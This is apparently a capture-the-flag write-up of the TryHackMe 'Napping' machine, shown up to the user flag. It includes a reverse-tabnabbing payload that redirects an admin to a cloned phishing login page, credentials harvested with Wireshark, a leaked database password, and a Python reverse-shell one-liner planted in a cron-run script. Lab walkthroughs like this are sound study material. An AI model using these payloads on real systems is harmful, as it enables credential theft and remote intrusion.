Napping is a medium diffiulty box from TryHackMe which had a interesting vulnerability called `Tab Nabbing` to phish the admin of the website to get user daniel's credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.

```

So there are 2 ports running

-> `22` - `OpenSSH 8.2p1`

-> `80`- `Apache httpd 2.4.41`

## Website - port 80

The webpage had just a simple login & sign up page .

![website1](../../assets/img/posts/Napping/website1.png)
*login page*

![website2](../../assets/img/posts/Napping/website2.png)
*signup page*

I tried default credentials, basic sql injection but those didn't work so I quickly went on to create an account & logged into the site.

We were greeted with a `welcome.php` page where we could submit a blog link & as the site says the blog link which we submitted will be reviewed by the admin. 

![website3](../../assets/img/posts/Napping/website3.png)

When I entered my website link ,it is displayed back for us to review it. 

![website4](../../assets/img/posts/Napping/website4.png)

Once clicked it will open the link we submitted in a new tab.

![website5](../../assets/img/posts/Napping/website5.png)

So we have some interesting directories `/admin` & `/admin/login.php` 

The /admin directory showed 403 but we were able to access the admin login page which is at `/admin/login.php`

# Shell as daniel

## Tab Nabbing

After this I was stuck for a while then I decided to google the name of the room like - "napping exploit" & then I got many results which was about  **Tab nabbing** - a web vulnerability which may cause a phishing attack .

> TAB NABBING:
    Reverse tabnabbing, or simply tabnabbing, is a `phishing attack` in which an attacker fools a victim into entering their credentials on a fake website controlled by the attacker
>
>   Reverse tabnabbing attacks are possible on websites that enable users to post links that, when clicked, open in a new tab. The link is opened in a new tab because of the link’s `target="_blank" property`.
>
>   A regular way to abuse this behaviour would be to change the location of `window.opener.location = https://attacker.com/victim.html` to a web controlled by the attacker that looks like the original one, so it can imitate the login form of the original website and ask for credentials to the user.

You could read more on how to exploit it here -> [Hacktricks](https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing)

**So the idea here is by using Tab Nabbing we could post a malicious link pointing to a fake admin login page of the website from our end, assuming that when the admin clicks on our link, he will get redirected to a new tab which has the fake admin login page of ours and enter his credentials thinking that he had accidentally logged out .**

##### Steps 

1. Create a file called `malicious.html` with the following contents

```html
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://<attacker-ip>:8000/phishing.html";
  </script>
 </body>
</html>
```

This will redirect the user who clicks it to the phishing.html page in a new tab.

2. Copy the source code of admin login page and save it as `phishing.html` which will trick the admin to enter his credentials.

3. Serve those files by spinning up a web server - `python3 -m http.server 8000`

4. Submit the link `http://<attacker-ip>:8000/malicious.html` in the website.

5. Run wireshark to capture tun0 packets

Now all we have to do is to wait for 2-3 mins for the admin to fall in our trap! kekw 

After few mins I got requests from the server for both of the fake html pages I created which essentially means the admin did visit our fake login page!

```

```
Interesting thing to see here is that there is a **POST** request sent back to us. Lets check wireshark for more information about that .

**Right click on the POST request** and select **Follow** -> **TCP stream**

![website9](../../assets/img/posts/Napping/website9.png)

Yay  we got a username called `daniel` & his password.

Using the credentials I was able to SSH in to machine as daniel .

```
We are a part of `administrators` group 

There are 3 users on the machine `root`, `daniel` & `adrian`

# Shell as adrian

```
daniel@napping:/home/adrian$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

We need to escalate our privileges to adrian to get the user flag.

Poking around the machine I found `config.php` at `/var/www/html` which had username & a password

```php
daniel@napping:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'Stop@Napping3!');
define('DB_NAME', 'website');
.
.
.
```
With the help of these credentials I was able to login to mysql@localhost but found nothing quite interesting there.

Visiting the home dir of adrian,

```
daniel@napping:/home/adrian$ ls -al

We have the user.txt her. We can view and edit the `query.py` file since we are a part of administrators group.

*osquery.py*
```python
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

The `site_status.txt` file hints that this script might be running in the background every  minute. 

*site_status.txt*
```
daniel@napping:/home/adrian$ cat site_status.txt
Site is Up: 24/03/2022 06:31:01
Site is Up: 24/03/2022 06:32:02
Site is Up: 24/03/2022 06:33:01
Site is Up: 24/03/2022 06:34:02
Site is Up: 24/03/2022 06:35:01
Site is Up: 24/03/2022 06:36:02

Site is Up: 24/03/2022 06:38:02
Site is Up: 24/03/2022 06:39:01
```

Lets add a python reverse shell oneliner at the end of the **osquery.py** script.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

After a minute we got a reverse shell back as **adrian**. Go ahead and grab the `user.txt` 🚩
